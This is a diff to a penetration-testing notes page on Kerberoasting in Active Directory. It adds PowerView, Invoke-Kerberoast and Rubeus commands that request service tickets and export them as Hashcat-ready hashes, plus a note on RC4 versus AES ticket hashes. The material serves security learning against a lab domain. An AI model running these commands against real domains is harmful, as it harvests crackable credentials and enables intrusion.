@@ -18,6 +18,7 @@ nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
 ```
 {% endcode %}
 
+{% code overflow="wrap" %}
 ```powershell
 # ADSearch
 ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
@@ -27,10 +28,16 @@ PS C:\> setspn -T vulnableone.local -Q */*
 
 # PowerView
 Get-DomainUser -SPN | select serviceprincipalname
+Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
+
+# Invoke-Kerberoast
+Import-Module .\PowerView.ps1
+Invoke-Kerberoast
 
 # AD-Module
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
+{% endcode %}
 
 ## Kerberoasting via AS-REP Roasting
 
@@ -55,6 +62,8 @@ Rubeus.exe kerberoast /stats
 Rubeus.exe kerberoast /rc4opsec /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
 Rubeus.exe kerberoast /rc4opsec /domain:vulnableone.local /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
 ```
+
+Note : The `/tgtdeleg` flag can be useful for us in situations where we find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when we perform a Kerberoast attack, we will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS tickets back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. We will know the difference because an RC4 encrypted ticket will return a hash that starts with the `$krb5tgs$23$*` prefix, while AES encrypted tickets will give us a hash that begins with `$krb5tgs$18$*`.
 
 ## Crack Hash
 
